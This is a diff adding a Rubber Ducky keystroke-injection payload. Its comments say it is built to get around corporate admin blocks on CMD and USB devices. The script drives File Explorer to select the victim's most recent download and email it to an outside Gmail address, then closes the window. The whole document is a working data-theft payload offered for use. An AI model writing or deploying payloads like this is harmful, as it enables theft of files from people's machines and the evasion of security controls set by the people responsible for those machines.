@@ -1,0 +1,59 @@
+REM used for when CMD and USB's are blocked by a corporate admin yet keystrokes are still deployable
+REM this is for teh rubber ducky
+REM doesnt emulate as a USB so gets around the blacklist used by admin
+REM Sends the most recent download to selected email 
+REM can be changed with <CONTROL a> to select multiple files.
+REM Author:FLYNN 
+ATTACKMODE HID STORAGE 
+DELAY 4500
+INJECT_MOD
+WINDOWS 
+DELAY 700
+STRING file
+DELAY 200
+ENTER 
+DELAY 2000
+TAB
+DELAY 200
+TAB 
+DELAY 200
+TAB
+DELAY 200
+ENTER 
+DELAY 500
+BACKSPACE 
+STRING Downloads 
+DELAY 500
+ENTER 
+DELAY 500
+DOWNARROW
+DELAY 200
+DOWNARROW
+DELAY 200
+UPARROW
+DELAY 200
+UPARROW
+DELAY 500
+INJECT_MOD
+ALT
+DELAY 300
+RIGHTARROW
+DELAY 200
+RIGHTARROW
+DELAY 200
+ENTER
+DELAY 200
+DOWNARROW
+DELAY 200
+RIGHTARROW
+DELAY 200
+ENTER
+DELAY 5000
+STRING johnjoneshcz"gmail.com
+DELAY 700
+CONTROL ENTER
+DELAY 500
+ENTER
+DELAY 2000
+ALT F4 
+
